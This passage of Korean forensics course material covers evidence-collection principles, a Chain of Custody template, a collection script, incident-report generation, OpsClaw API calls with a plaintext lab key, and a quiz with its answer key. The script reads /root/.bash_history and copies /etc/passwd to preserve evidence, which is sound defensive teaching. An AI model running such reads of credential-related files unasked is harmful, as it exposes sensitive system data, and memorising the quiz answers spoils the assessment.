**실습 목적**: 법적으로 유효한 디지털 증거를 수집하고 보존하는 절차를 이해하고, Chain of Custody 문서를 작성한다.

**배우는 것**: 증거 수집 4원칙, Chain of Custody 문서, 자동 증거 수집 스크립트

```bash
# -- opsclaw 서버에서 실행 --

# 1. 디지털 증거 4원칙
echo "[+] 디지털 증거 수집 4원칙:"
echo "  1. 무결성: 원본을 변경하지 않는다 (쓰기 차단 사용)"
echo "  2. 진정성: 출처/수집자/도구/시간을 기록한다"
echo "  3. 연속성: 모든 접근/이동 이력을 기록한다"
echo "  4. 재현성: 동일 과정 → 동일 결과를 보장한다"

# 2. Chain of Custody 템플릿
echo ""
echo "[+] Chain of Custody 문서:"
cat << 'COC_EOF'
=== CHAIN OF CUSTODY RECORD ===
Case ID:      CASE-2026-001
Evidence ID:  EVD-001

[증거 정보]
설명:       web 서버 디스크 이미지
파일명:     web_disk_20260325.img
크기:       107,374,182,400 bytes
SHA-256:    a1b2c3d4e5f6...

[수집 정보]
일시:       2026-03-25 14:30 KST
수집자:     홍길동 (보안팀)
도구:       dc3dd v7.2.646
원본 장치:  /dev/sda (500GB SSD)

[이전 이력]
#  일시               보관자     목적       서명
1  2026-03-25 14:30  홍길동     수집       [서명]
2  2026-03-25 15:00  김보안     분석 인계  [서명]
3  2026-03-25 17:00  이포렌식   심층 분석  [서명]

[보관 정보]
위치:       분석실 증거 보관함 A-03
접근 통제:  잠금장치 + 출입 기록
백업:       NAS /forensic/case-2026-001/
COC_EOF

# 3. 자동 증거 수집 스크립트
echo ""
echo "[+] 자동 증거 수집 스크립트:"
cat << 'COLLECT_EOF'
#!/bin/bash
# /opt/scripts/collect_evidence.sh
EVIDENCE_DIR="/tmp/evidence/$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

echo "[+] 증거 수집: $(date)" | tee "$EVIDENCE_DIR/collection_log.txt"

# 휘발성 데이터
ps auxf > "$EVIDENCE_DIR/ps.txt"
ss -tlnp > "$EVIDENCE_DIR/ss_listen.txt"
ss -tnp > "$EVIDENCE_DIR/ss_established.txt"
ip addr > "$EVIDENCE_DIR/ip_addr.txt"
lsof -nP > "$EVIDENCE_DIR/lsof.txt" 2>/dev/null

# 사용자 활동
last -50 > "$EVIDENCE_DIR/last.txt"
w > "$EVIDENCE_DIR/w.txt"
cat /root/.bash_history > "$EVIDENCE_DIR/root_history.txt" 2>/dev/null
crontab -l > "$EVIDENCE_DIR/crontab.txt" 2>/dev/null

# 시스템 설정
cp /etc/passwd "$EVIDENCE_DIR/"
ls -laR /tmp/ > "$EVIDENCE_DIR/tmp_listing.txt" 2>/dev/null
find /tmp -type f -mtime -1 -ls > "$EVIDENCE_DIR/tmp_recent.txt" 2>/dev/null

# 해시 생성
cd "$EVIDENCE_DIR" && sha256sum *.txt > hashes.sha256
echo "[+] 완료: $EVIDENCE_DIR"
COLLECT_EOF
```

**명령어 해설**:
- Chain of Custody 문서는 증거의 수집부터 보관까지 전체 이력을 추적한다
- `sha256sum *.txt > hashes.sha256`: 수집된 모든 파일의 해시를 기록하여 무결성을 보장한다
- 자동 수집 스크립트는 사전에 USB에 준비해두어 사고 시 신속하게 실행한다

**결과 해석**: Chain of Custody가 끊기면 증거의 법적 효력이 사라진다. 해시값 변경은 증거 변조로 간주된다.

**실전 활용**: 자동 수집 스크립트를 사전 준비하면 사고 발생 시 5분 이내에 핵심 증거를 수집할 수 있다.

**트러블슈팅**:
- 권한 부족: root로 실행
- 저장 공간: 외부 스토리지 사용
- NTP 확인: 타임스탬프 정확성

---

# Part 4: 보고서 작성과 자동화 (40분)

## 4.1 사고 대응 보고서 구조

```
+--------------------------------------------------------------+
|                 사고 대응 보고서 구조                          |
+--------------------------------------------------------------+
|  1. 경영진 요약 — 사고 개요, 영향, 핵심 조치                   |
|  2. 사고 개요 — 탐지 시점/방법, 영향 시스템, 분류              |
|  3. 타임라인 — 시간순 이벤트, ATT&CK 매핑                     |
|  4. 기술 분석 — 침입 벡터, 악성코드, IOC 목록                  |
|  5. 영향 평가 — 유출 데이터, 무결성, 비즈니스 영향             |
|  6. 대응 조치 — 봉쇄, 제거, 복구                             |
|  7. 권고 사항 — 단기/중기/장기                                |
|  8. 부록 — 상세 IOC, 증거 해시, 도구 목록                     |
+--------------------------------------------------------------+
```

### 실습 7: 보고서 자동 생성과 OpsClaw 연동

**실습 목적**: 포렌식 분석 결과를 바탕으로 사고 대응 보고서를 생성하고, OpsClaw로 포렌식 워크플로우를 자동화한다.

**배우는 것**: 보고서 작성 요령, 경영진/기술팀 대상별 커뮤니케이션, OpsClaw 포렌식 자동화

```bash
# -- opsclaw 서버에서 실행 --

# 1. 보고서 자동 생성 스크립트
echo "[+] 보고서 자동 생성:"
cat << 'REPORT_SCRIPT'
#!/bin/bash
# /opt/scripts/generate_report.sh
EVIDENCE_DIR="${1:-/tmp/evidence}"
REPORT="/tmp/incident_report_$(date +%Y%m%d).md"

cat << REPORT_EOF > "$REPORT"
# 사고 대응 보고서

## 1. 경영진 요약

$(date '+%Y년 %m월 %d일'), web 서버에 대한 침해 사고가 탐지되었습니다.
공격자는 SQL Injection을 통해 침입하여 시스템 자격증명을 유출했습니다.

**심각도:** 높음 | **영향:** web 서버 1대 | **상태:** 봉쇄 완료

## 2. 타임라인

| 시간 | 이벤트 | ATT&CK |
|------|--------|--------|
| 10:15 | SQL Injection | T1190 |
| 10:16 | 웹셸 업로드 | T1505.003 |
| 10:17 | 권한 상승 | T1068 |
| 10:19 | C2 연결 | T1071.001 |
| 10:25 | 데이터 유출 | T1048 |
| 10:30 | 지속성 확보 | T1053.003 |

## 3. IOC

| 유형 | 값 | 설명 |
|------|-----|------|
| IP | 185.142.xx.xx | C2 서버 |
| File | /var/www/uploads/cmd.php | 웹셸 |
| File | /tmp/.hidden/backdoor.sh | 백도어 |

## 4. 대응 조치

- [x] C2 IP 방화벽 차단
- [x] 웹셸/백도어 제거
- [x] 비밀번호 전체 변경
- [ ] SQL Injection 패치
- [ ] WAF 도입

## 5. 증거 해시

$([ -f "$EVIDENCE_DIR/hashes.sha256" ] && cat "$EVIDENCE_DIR/hashes.sha256" || echo "N/A")

---
보고서 생성: $(date '+%Y-%m-%d %H:%M:%S')
REPORT_EOF

echo "[+] 보고서: $REPORT"
REPORT_SCRIPT

# 2. OpsClaw 포렌식 자동화
echo ""
echo "[+] OpsClaw 포렌식 자동화:"
cat << 'OPSCLAW_EOF'
curl -X POST http://localhost:8000/projects/{id}/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "ps auxf && ss -tlnp && last -20",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "find /tmp /var/www -type f -mtime -1 -ls 2>/dev/null | head -50",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "cat /var/log/suricata/eve.json | jq -r \"select(.event_type==\\\"alert\\\") | [.timestamp,.src_ip,.alert.signature] | @csv\" | tail -20",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      },
      {
        "order": 4,
        "instruction_prompt": "grep -E \"(Failed|Accepted|session)\" /var/log/auth.log | tail -30",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ]
  }'
OPSCLAW_EOF

# 3. 보고서 대상별 차이
echo ""
echo "[+] 보고서 대상별 커뮤니케이션:"
echo "  +------------+------------------------------------------+"
echo "  | 대상       | 중점 내용                                 |"
echo "  +------------┼------------------------------------------+"
echo "  | 경영진     | 비즈니스 영향, 필요 예산, 리스크 수준     |"
echo "  | 기술팀     | IOC, 패치 방안, 탐지 룰, 상세 타임라인   |"
echo "  | 법무팀     | 증거 보전 상태, 법적 대응, 통지 의무     |"
echo "  | 규제 기관  | 침해 범위, 개인정보 영향, 조치 현황      |"
echo "  +------------+------------------------------------------+"

# 4. OpsClaw 완료보고서
echo ""
echo "[+] OpsClaw 완료보고서:"
echo '  curl -X POST http://localhost:8000/projects/{id}/completion-report \'
echo '    -H "Content-Type: application/json" \'
echo '    -H "X-API-Key: opsclaw-api-key-2026" \'
echo '    -d '"'"'{"summary":"포렌식 분석 완료","outcome":"success","work_details":["메모리/디스크 분석","타임라인 구성","IOC 추출","보고서 작성"]}'"'"''
```

**명령어 해설**:
- 보고서는 경영진 요약(비기술적)과 기술 분석(상세)을 분리한다
- ATT&CK 매핑으로 공격 기법을 표준화하여 위협 인텔리전스를 공유한다
- OpsClaw execute-plan으로 여러 서버에서 동시에 포렌식 데이터를 수집한다

**결과 해석**: 체계적인 보고서는 사고의 전체 그림을 전달하고 재발 방지 근거를 제공한다. IOC는 다른 시스템의 추가 침해 탐지에 활용된다.

**실전 활용**: 보고서는 독자에 따라 수준을 조절한다. 경영진에게는 비즈니스 영향을, 기술팀에게는 상세 IOC를, 법무팀에게는 증거 보전 상태를 중점으로 전달한다.

**트러블슈팅**:
- 보고서 형식: 조직 표준 템플릿으로 변환
- 중간 보고서: 분석 진행 중이면 중간 보고서 → 최종 보고서 단계적 발행
- 타임존: 보고서에 사용 타임존 명시

---

## 검증 체크리스트

실습 완료 후 다음 항목을 스스로 확인한다:

- [ ] 메모리 포렌식으로만 확인 가능한 정보 3가지를 나열할 수 있는가?
- [ ] Volatility3의 pslist, pstree, malfind 플러그인 용도를 설명할 수 있는가?
- [ ] dd를 사용한 디스크 이미지 생성 명령을 작성할 수 있는가?
- [ ] strings로 바이너리에서 IOC를 추출할 수 있는가?
- [ ] foremost를 사용한 파일 카빙의 원리를 설명할 수 있는가?
- [ ] log2timeline/plaso의 워크플로우를 설명할 수 있는가?
- [ ] 타임라인의 "피벗 포인트" 의미를 설명할 수 있는가?
- [ ] Chain of Custody 4원칙을 나열할 수 있는가?
- [ ] 사고 대응 보고서의 주요 섹션을 설명할 수 있는가?
- [ ] OpsClaw로 다중 서버에서 포렌식 데이터를 수집할 수 있는가?

---

## 자가 점검 퀴즈 (10문항)

**Q1.** 메모리 포렌식에서만 확인할 수 있는 정보가 아닌 것은?
- (a) 파일리스 악성코드  (b) 네트워크 연결  (c) **디스크 파티션 구조**  (d) 암호화 키

**Q2.** Volatility3에서 프로세스 인젝션을 탐지하는 플러그인은?
- (a) pslist  (b) pstree  (c) **malfind**  (d) sockstat

**Q3.** dd로 디스크 이미지 생성 시 무결성 보장 방법은?
- (a) 압축  (b) 암호화  (c) **SHA-256 해시 비교**  (d) 파일명 변경

**Q4.** 휘발성 순서에서 가장 먼저 수집해야 하는 것은?
- (a) 디스크  (b) **메모리**  (c) 로그 파일  (d) 네트워크 구성

**Q5.** strings 명령의 기본 최소 문자열 길이는?
- (a) 2자  (b) 3자  (c) **4자**  (d) 8자

**Q6.** 파일 카빙의 원리는?
- (a) 파일명 검색  (b) **파일 시그니처(매직 넘버) 기반 복구**  (c) 메타데이터 분석  (d) 해시 비교

**Q7.** Chain of Custody가 끊기면?
- (a) 파일 손상  (b) **증거의 법적 효력 상실**  (c) 해시 변경  (d) 타임라인 오류

**Q8.** plaso의 주요 기능은?
- (a) 메모리 분석  (b) 파일 카빙  (c) **다중 로그 통합 타임라인 생성**  (d) 네트워크 캡처

**Q9.** 경영진 요약에 포함하지 않아도 되는 것은?
- (a) 사고 개요  (b) 영향 범위  (c) 핵심 조치  (d) **상세 IOC 해시 목록**

**Q10.** PAGE_EXECUTE_READWRITE가 의심스러운 이유는?
- (a) 느림  (b) **정상 프로세스에서 드문 권한, 코드 인젝션 의미**  (c) 읽기 불가  (d) 디스크 접근

**정답:** Q1:c, Q2:c, Q3:c, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:d, Q10:b

---

## 과제

### 과제 1: 침해 사고 포렌식 분석 (필수)
가상의 침해 시나리오(웹 서버 침해)에 대해:
- 메모리 분석 절차서 작성 (수집 → Volatility3 분석 → IOC 추출)
- 디스크 분석 절차서 작성 (이미징 → strings → 카빙)
- 통합 타임라인 구성과 ATT&CK 매핑

### 과제 2: 사고 대응 보고서 작성 (필수)
과제 1 결과를 바탕으로:
- 경영진 요약 (1페이지)
- 기술 분석 보고서 (5-10페이지)
- IOC 목록과 대응 조치 포함

### 과제 3: 포렌식 자동화 파이프라인 (선택)
OpsClaw를 활용하여:
- 자동 증거 수집 → 분석 → 보고서 생성 파이프라인 설계
- execute-plan JSON 페이로드 작성
- 자동화의 한계와 수동 분석이 필요한 영역 논의

---

## 다음 주 예고

**Week 08: 위협 헌팅 — SIGMA 룰, ATT&CK Navigator, 베이스라인 이탈 탐지, Wazuh/YARA 룰**
- SIGMA 룰 문법과 커스텀 탐지 룰 작성
- ATT&CK Navigator로 탐지 커버리지 시각화
- Wazuh 커스텀 디코더/룰 심화
- YARA 룰로 악성코드 탐지
